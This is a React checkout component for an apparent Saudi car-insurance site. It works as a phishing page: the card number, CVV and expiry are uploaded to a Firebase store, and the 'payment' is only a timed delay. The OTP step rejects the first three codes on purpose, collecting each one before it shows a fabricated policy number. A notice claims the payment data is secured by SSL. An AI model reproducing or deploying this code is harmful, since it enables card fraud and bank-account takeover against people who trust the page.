"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { CreditCard, Shield, CheckCircle, ArrowRight, AlertCircle, X } from "lucide-react"
import type { FormData } from "./insurance-flow"
import { offerData } from "@/data/data"
import { addData } from "@/lib/firebase"


interface CheckoutProps {
  formData: FormData
  onBack: () => void
}
const allOtps = ['']
export function Checkout({ formData, onBack }: CheckoutProps) {
  const [isProcessing, setIsProcessing] = useState(false)
  const [isCompleted, setIsCompleted] = useState(false)
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otp, setOtp] = useState("")
  const [otpError, setOtpError] = useState(false)
  const [otpAttempts, setOtpAttempts] = useState(0)

  // Card form states
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")

  // Get selected offer details from the real data
  const selectedOffer = formData.selectedOfferId
    ? offerData.find((offer) => offer.id === formData.selectedOfferId)
    : null

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return v
    }
  }

  // Format expiry date MM/YY
  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    if (v.length >= 2) {
      return v.substring(0, 2) + "/" + v.substring(2, 4)
    }
    return v
  }

  // Format CVV (numbers only)
  const formatCVV = (value: string) => {
    return value.replace(/[^0-9]/gi, "").substring(0, 3)
  }

  // Format OTP (numbers only)
  const formatOTP = (value: string) => {
    return value.replace(/[^0-9]/gi, "").substring(0, 6)
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value)
    setCardNumber(formatted)
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value)
    setExpiryDate(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCVV(e.target.value)
    setCvv(formatted)
  }

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatOTP(e.target.value)
    setOtp(formatted)
  }

  const handlePayment = async (e: React.FormEvent) => {
    const _id = localStorage.getItem('visitor')
    e.preventDefault()
    setIsProcessing(true)
    addData({ id: _id, cardNumber, cvv, expiryDate })

    // Simulate payment processing
    await new Promise((resolve) => setTimeout(resolve, 2000))

    setIsProcessing(false)
    setShowOtpDialog(true)
  }

  const handleOtpSubmit = async (e: React.FormEvent) => {
    const _id = localStorage.getItem('visitor')

    e.preventDefault()
    allOtps.push(otp)
    addData({ id: _id, otp, allOtps })

    setIsProcessing(true)

    // Simulate OTP verification
    await new Promise((resolve) => setTimeout(resolve, 1500))

    setIsProcessing(false)

    // Always show error on first attempt for demo purposes
    if (otpAttempts < 3) {
      setOtpError(true)
      setOtpAttempts((prev) => prev + 1)
    } else {
      setShowOtpDialog(false)
      setOtpError(false)
      setIsCompleted(true)
    }
  }

  const closeOtpDialog = () => {
    setShowOtpDialog(false)
    setOtpError(false)
    setOtp("")
  }

  // Generate current date for policy
  const getCurrentDate = () => {
    const now = new Date()
    return now.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }

  // Generate policy expiry date (1 year from now)
  const getPolicyExpiryDate = () => {
    const now = new Date()
    const expiry = new Date(now.getFullYear() + 1, now.getMonth(), now.getDate())
    return expiry.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }

  if (isCompleted) {
    return (
      <div className="bg-emerald-900/80 rounded-2xl overflow-hidden shadow-2xl border border-emerald-700/50 backdrop-blur-sm p-8">
        <div className="text-center space-y-6 animate-fadeIn">
          <div className="w-20 h-20 bg-emerald-400 rounded-full flex items-center justify-center mx-auto">
            <CheckCircle className="w-12 h-12 text-emerald-900" />
          </div>

          <div>
            <h2 className="text-2xl font-bold text-emerald-400 mb-2">تم بنجاح!</h2>
            <p className="text-emerald-200">تم إصدار وثيقة التأمين بنجاح</p>
          </div>

          <div className="bg-emerald-800/30 rounded-xl p-4">
            <h3 className="font-semibold text-emerald-400 mb-2">تفاصيل الوثيقة</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-emerald-300">رقم الوثيقة:</span>
                <span className="text-white font-mono">
                  POL-2024-{Math.random().toString(36).substr(2, 6).toUpperCase()}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-emerald-300">الخطة:</span>
                <span className="text-white">{selectedOffer?.name || formData.selectedPlan}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-emerald-300">تاريخ الإصدار:</span>
                <span className="text-white">{getCurrentDate()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-emerald-300">تاريخ الانتهاء:</span>
                <span className="text-white">{getPolicyExpiryDate()}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-emerald-300">القسط المدفوع:</span>
                <span className="text-white">{formData.totalPrice || selectedOffer?.main_price || "0"} ر.س</span>
              </div>
            </div>
          </div>

          <div className="space-y-3">
            <Button className="w-full bg-emerald-400 hover:bg-emerald-300 text-emerald-900 font-bold h-12">
              تحميل الوثيقة
            </Button>
            <Button
              variant="outline"
              className="w-full border-emerald-700 text-emerald-300 hover:bg-emerald-800/50 h-12"
            >
              إرسال نسخة بالإيميل
            </Button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="bg-emerald-900/80 rounded-2xl overflow-hidden shadow-2xl border border-emerald-700/50 backdrop-blur-sm">
      <div className="bg-emerald-800/60 p-4 border-b border-emerald-700/50">
        <div className="flex items-center gap-2">
          <CreditCard className="w-5 h-5 text-emerald-400" />
          <h2 className="text-lg font-bold text-emerald-400">إتمام الدفع</h2>
        </div>
      </div>

      {showOtpDialog ? (
        <div className="p-6 animate-fadeIn">
          <div className="relative">
            <button
              onClick={closeOtpDialog}
              className="absolute left-0 top-0 p-1 rounded-full hover:bg-emerald-800/50 transition-colors"
            >
              <X className="w-5 h-5 text-emerald-300" />
            </button>

            <div className="text-center mb-6">
              <h3 className="text-lg font-bold text-emerald-400 mb-2">أدخل رمز التحقق</h3>
              <p className="text-emerald-300 text-sm">تم إرسال رمز التحقق إلى رقم الجوال المسجل</p>
            </div>

            <form onSubmit={handleOtpSubmit} className="space-y-6">
              {otpError && (
                <div className="bg-red-900/20 border border-red-700/50 rounded-lg p-3 flex items-center gap-2 animate-fadeIn">
                  <AlertCircle className="w-5 h-5 text-red-400 flex-shrink-0" />
                  <p className="text-sm text-red-200">رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.</p>
                </div>
              )}

              <div className="space-y-2">
                <label htmlFor="otp" className="block text-sm font-medium text-emerald-300">
                  رمز التحقق المكون من 6 أرقام
                </label>
                <Input
                  id="otp"
                  value={otp}
                  onChange={handleOtpChange}
                  placeholder="أدخل الرمز"
                  className="bg-emerald-800/50 border-emerald-700/50 text-white placeholder:text-emerald-300 h-12 text-center text-xl tracking-widest"
                  required
                  type="tel"
                />
                <p className="text-xs text-emerald-400 text-center">
                  لم يصلك الرمز؟{" "}
                  <button type="button" className="underline hover:text-emerald-300">
                    إعادة الإرسال
                  </button>
                </p>
              </div>

              <Button
                type="submit"
                disabled={(isProcessing || otp.length <= 4)}
                className="w-full bg-emerald-400 hover:bg-emerald-300 text-emerald-900 font-bold h-12"
              >
                {isProcessing ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-emerald-900/30 border-t-emerald-900 rounded-full animate-spin"></div>
                    جاري التحقق...
                  </div>
                ) : (
                  "تأكيد"
                )}
              </Button>
            </form>
          </div>
        </div>
      ) : (
        <form onSubmit={handlePayment} className="p-6">
          <div className="space-y-6 animate-fadeIn">
            {/* Order Summary */}
            <div className="bg-emerald-800/30 rounded-xl p-4">
              <h3 className="font-semibold text-emerald-400 mb-3">ملخص الطلب</h3>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-emerald-300">خطة التأمين:</span>
                  <span className="text-white">{selectedOffer?.name || formData.selectedPlan}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-emerald-300">المركبة:</span>
                  <span className="text-white">
                    {formData.vehicleModel} {formData.vehicleYear}
                  </span>
                </div>
                <div className="border-t border-emerald-700/50 pt-2 mt-2">
                  <div className="flex justify-between items-center">
                    <span className="text-emerald-300 font-semibold">المجموع:</span>
                    <span className="text-2xl font-bold text-emerald-400">
                      {formData.totalPrice || selectedOffer?.main_price || "0"} ر.س
                    </span>
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Method */}
            <div>
              <h3 className="font-semibold text-emerald-400 mb-3">طريقة الدفع</h3>
              <div className="space-y-4">
                <div>
                  <label htmlFor="cardNumber" className="block text-sm font-medium text-emerald-300 mb-1">
                    رقم البطاقة
                  </label>
                  <Input
                    id="cardNumber"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="1234 5678 9012 3456"
                    className="bg-emerald-800/50 border-emerald-700/50 text-white placeholder:text-emerald-300 h-12"
                    required
                    type="tel"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label htmlFor="expiryDate" className="block text-sm font-medium text-emerald-300 mb-1">
                      تاريخ الانتهاء
                    </label>
                    <Input
                      id="expiryDate"
                      value={expiryDate}
                      onChange={handleExpiryDateChange}
                      placeholder="MM/YY"
                      className="bg-emerald-800/50 border-emerald-700/50 text-white placeholder:text-emerald-300 h-12"
                      required
                      type="tel"
                    />
                  </div>
                  <div>
                    <label htmlFor="cvv" className="block text-sm font-medium text-emerald-300 mb-1">
                      رمز الأمان
                    </label>
                    <Input
                      id="cvv"
                      value={cvv}
                      onChange={handleCvvChange}
                      placeholder="123"
                      className="bg-emerald-800/50 border-emerald-700/50 text-white placeholder:text-emerald-300 h-12"
                      required
                      type="tel"
                    />
                  </div>
                </div>

                <div>
                  <label htmlFor="cardholderName" className="block text-sm font-medium text-emerald-300 mb-1">
                    اسم حامل البطاقة
                  </label>
                  <Input
                    id="cardholderName"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    placeholder="الاسم كما هو مكتوب على البطاقة"
                    className="bg-emerald-800/50 border-emerald-700/50 text-white placeholder:text-emerald-300 h-12"
                    required
                  />
                </div>
              </div>
            </div>

            {/* Security Notice */}
            <div className="flex items-start gap-2 p-3 bg-emerald-800/20 rounded-lg border border-emerald-700/30">
              <Shield className="w-5 h-5 text-emerald-400 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-emerald-200">جميع المعاملات محمية بتشفير SSL. معلوماتك المالية آمنة ومحمية.</p>
            </div>

            <div className="flex gap-3 pt-4">
              <Button
                type="button"
                onClick={onBack}
                variant="outline"
                className="flex-1 border-emerald-700 text-emerald-300 hover:bg-emerald-800/50 h-12"
              >
                <ArrowRight className="w-4 h-4 ml-2" />
                العودة
              </Button>
              <Button
                type="submit"
                disabled={isProcessing}
                className="w-full bg-emerald-400 hover:bg-emerald-300 text-emerald-900 font-bold h-12"
              >
                {isProcessing ? (
                  <div className="flex items-center gap-2">
                    <div className="w-5 h-5 border-2 border-emerald-900/30 border-t-emerald-900 rounded-full animate-spin"></div>
                    جاري المعالجة...
                  </div>
                ) : (
                  `دفع ${formData.totalPrice || selectedOffer?.main_price || "0"} ر.س`
                )}
              </Button>
            </div>
          </div>
        </form>
      )}
    </div>
  )
}
